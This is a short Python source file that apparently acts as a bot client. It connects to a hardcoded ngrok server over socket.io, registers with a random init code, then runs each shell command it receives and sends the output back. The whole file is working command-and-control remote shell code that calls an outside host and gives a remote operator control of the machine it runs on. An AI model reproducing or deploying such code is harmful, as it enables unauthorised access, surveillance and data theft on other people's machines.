import socketio
from cmd_executer import execute_shell_command
from random import randrange
import requests

sio = socketio.Client()

@sio.event
def handle_bot_command(data):
    print(data)
    try:
        response = execute_shell_command(data)
    except:
        response = "Unknown command"
    else:
        if(len(response) > 2500 or len(response) == 0):
            response = ">> Wrong response"
    sio.emit('command_response', str(initialization_code) + ' ' + response)

def main():
    url = 'https://c614-89-178-159-143.ngrok.io'
    sio.connect(url)
    
    global initialization_code
    initialization_code = randrange(10)
    print("Init code: ", initialization_code)

    requests.post('{}/add-pending-client'.format(url), data={'init_code': str(initialization_code)})
    print('Added to pending clients...')
    requests.post('{}/wait-for-initialization'.format(url), data={'init_code': str(initialization_code)})
    print('Initialized')

    sio.emit('command_response', str(initialization_code) + ' ')
    
    while True:
        pass

main()



